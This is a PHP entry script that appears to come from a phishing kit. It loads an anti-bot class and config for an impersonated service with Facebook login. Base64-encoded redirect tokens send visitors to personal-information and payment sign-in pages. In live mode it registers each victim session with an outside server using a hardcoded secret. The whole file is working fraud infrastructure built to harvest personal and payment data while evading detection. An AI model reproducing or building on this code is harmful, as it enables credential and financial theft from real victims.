<?php

@session_start();

require_once __DIR__ . "/Functions/utility.class.php";

$utilityClass = new UtilityClass();

require_once __DIR__ . "/Custom/Antibot/antibot.class.php";

$antibot = new AntiBotPDTeam();

require_once __DIR__ . "/Custom/vendor/autoload.php";

include_once __DIR__ . "/Generations/utilities.php";

$pageInformation = $utilityClass->readJsonFile(__DIR__ . "/../config/page-information.json");

$startPage = $pageInformation->startPage;
$pageId = $pageInformation->pageId;

// Custom Logic
$serviceFrom = $pageInformation->serviceFromName;
$serviceTo = $pageInformation->serviceToName;
$enableFacebookLogin = $pageInformation->enableFacebookLogin;
$facebookLink = $pageInformation->facebookLink;
$enableLogin = $pageInformation->enableLogin;
$liveMode = $pageInformation->liveMode;

if(!isset($_GET["lang"]) || empty($_GET["lang"])) {
    $_GET["lang"] = "en";
}

if(!isset($_GET["tracker"]) || empty($_GET["tracker"])) {
    $_GET["tracker"] = 0;
}

$_SESSION["serviceFromName"] = $serviceFrom;
$_SESSION["serviceToName"] = $serviceTo;
$_SESSION["enableFacebookLogin"] = (bool) $enableFacebookLogin;
$_SESSION["facebookLink"] = $facebookLink;
$_SESSION["language"] = $_GET["lang"];
$_SESSION["enableLogin"] = $enableLogin;
$_SESSION["liveMode"] = $liveMode;
$_SESSION["tracker"] = $_GET["tracker"];

if(!($utilityClass->validatePageId())) {
    $utilityClass->displayNotFoundError();
}

if($_SESSION["liveMode"]) {

    $client = new \phpcent\Client("https://asgailh24.site/api");

    if(empty($_SESSION["uuid"]) || empty($_SESSION["token"])) {
        $_SESSION["uuid"] = $utilityClass->generateUuidV4();
        $token = $client->setSecret("njkgsdnjkgnasdkjgnsdhjbgajhsfsdfsdgsb")->generateConnectionToken($_SESSION["uuid"]);
        $_SESSION['token'] = $token;
    
        $utilityClass->insertNewSession();
    }
    

}

if(isset($_GET["authentication-metadata-token"]) && !empty($_GET["authentication-metadata-token"])) {
    $redirectPage = trim($_GET["authentication-metadata-token"]);

    if($redirectPage == "SW5kZXgtZ3ZiaGprbmZzZGtqbmRmZ3M=") {
        $startPage = "LandingPage/main.php";
    } else if($redirectPage == "UGVyc29uYWwtamtnYmtkZmJqZ2hiamRmZ2Q=") {
        $startPage = "SignIn/personal.php";
    } else if($redirectPage == "UGF5bWVudC1iZGZzZ3Nnc2Rnc2RhZ3Nz") {
        $startPage = "SignIn/payment.php";
    }

}

require_once __DIR__ . "/../views/" . $startPage;
